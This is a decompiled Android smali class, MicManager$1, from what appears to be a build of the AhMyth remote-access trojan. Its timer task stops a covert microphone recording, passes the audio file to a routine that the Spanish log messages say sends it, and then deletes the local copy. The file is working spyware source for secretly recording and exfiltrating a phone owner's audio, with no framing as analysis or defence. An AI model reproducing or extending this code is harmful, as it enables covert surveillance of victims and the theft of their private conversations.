.class final Lahmyth/mine/king/ahmyth/MicManager$1;
.super Ljava/util/TimerTask;
.source "MicManager.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lahmyth/mine/king/ahmyth/MicManager;->startRecording(I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .line 120
    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    const-string v0, "MIC"

    .line 124
    :try_start_0
    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    if-eqz v1, :cond_0

    .line 125
    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->stop()V

    const-string v1, "\u23f9 Grabaci\u00f3n detenida"

    .line 126
    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 129
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\u274c Error al detener grabaci\u00f3n: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 132
    :cond_0
    :goto_0
    :try_start_1
    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    if-eqz v1, :cond_1

    .line 133
    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->release()V

    const/4 v1, 0x0

    .line 134
    sput-object v1, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    const-string v1, "\u2705 Recorder liberado"

    .line 135
    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v1

    .line 138
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\u274c Error al liberar recorder: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_1
    const/4 v1, 0x0

    .line 141
    sput-boolean v1, Lahmyth/mine/king/ahmyth/MicManager;->isRecording:Z

    .line 143
    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;

    if-eqz v1, :cond_2

    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 144
    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;

    invoke-static {v1}, Lahmyth/mine/king/ahmyth/MicManager;->access$000(Ljava/io/File;)V

    .line 145
    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    const-string v1, "\u2705 Archivo de audio eliminado despu\u00e9s de enviar"

    .line 146
    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_2
    return-void
.end method
